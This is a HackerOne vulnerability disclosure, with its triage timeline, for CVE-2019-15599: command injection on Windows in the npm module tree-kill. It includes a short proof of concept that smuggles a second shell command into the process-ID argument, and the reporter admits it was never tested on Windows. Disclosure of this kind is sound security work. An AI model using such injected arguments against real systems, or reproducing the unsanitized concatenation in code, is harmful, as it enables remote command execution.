---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/web
  - stack/node
  - os/windows
  - impact/rce
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2019-12-04
submitted: 2019-09-24T19:40:58.828Z
bounty_usd: null
votes: 15
cve: "CVE-2019-15599"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "mik317"
source: "https://hackerone.com/reports/701183"
title: "[tree-kill] RCE via insecure command concatenation (only Windows)"
---
# [tree-kill] RCE via insecure command concatenation (only Windows)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 15 | **Program:** Node.js third-party modules | **Disclosed:** 2019-12-04

- Report: [https://hackerone.com/reports/701183](https://hackerone.com/reports/701183)
- CWE: Code Injection | CVE: CVE-2019-15599
- Submitted: 2019-09-24T19:40:58.828Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a `RCE` issue in the `tree-kill` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `tree-kill`
**version:** `1.2.1`
**npm page:** `https://www.npmjs.com/package/tree-kill`

## Module Description
> Kill all processes in the process tree, including the root process.

## Module Stats
[N/A] downloads in the last day
[2,108,440] downloads in the last week
[~10M] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is concatenated with a `command` that will be executed without any check. The issue arises here: https://github.com/pkrumins/node-tree-kill/blob/master/index.js#L20 (as you can see, the `Linux` part is sanitized, while the `Win` one no ... it simply uses the `+` operand to concatenate the input)

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var kill = require('tree-kill');
kill('3333332 & echo "HACKED" > HACKED.txt & ');
```
1. Execute the following commands in another terminal:

```bash
npm i tree-kill # Install affected module
dir # Check *HACKED.txt* doesn't exist
node poc.js #  Run the PoC
dir # Now *HACKED.txt* exists :)
```
1. A new file called `HACKED.txt` will be created, containing the `HACKED` string
Note I can't provide a screenshot as I'm working on `Linux` (I'll be able to reinstall win only the next week), but the code showed in the module (line 20) makes clear the attack is possible. Pls note I'm not sure of the `batch syntax used` , as said I can't verify it on a `win` machine. Before close the report, share with me eventual problems, in order to make me able to determine if the provided PoC is fully working or lacks in something :)

## Patch
> Don't concatenate `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux (should be used a `win OS` ... I've simply checked the code)
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` on `tree-kill` via `insecure command concatenation`

## Timeline

- **Report Filed**
- **2019-09-25** @nochnoidozor: Hi @mik317,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Severity Updated**
- **Report Triaged**
- **2019-09-25** @mik317: Thank you :)
This is my record report :)

Best, Mik
- **2019-10-07** @lirantal: @mik317 thanks for sending this report!
I invited the package maintainer to jump in and review the issue so we can work on a fix.
- **2019-10-08** @mik317: Thank you :)

Best, Mik
- **2019-11-08** @mik317: Hi :)
Any news regarding the fixes?

Best, Mik
- **2019-12-04** @lirantal: I'll move forward with disclosing due to no reply from maintainer
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
- **Changed Scope**
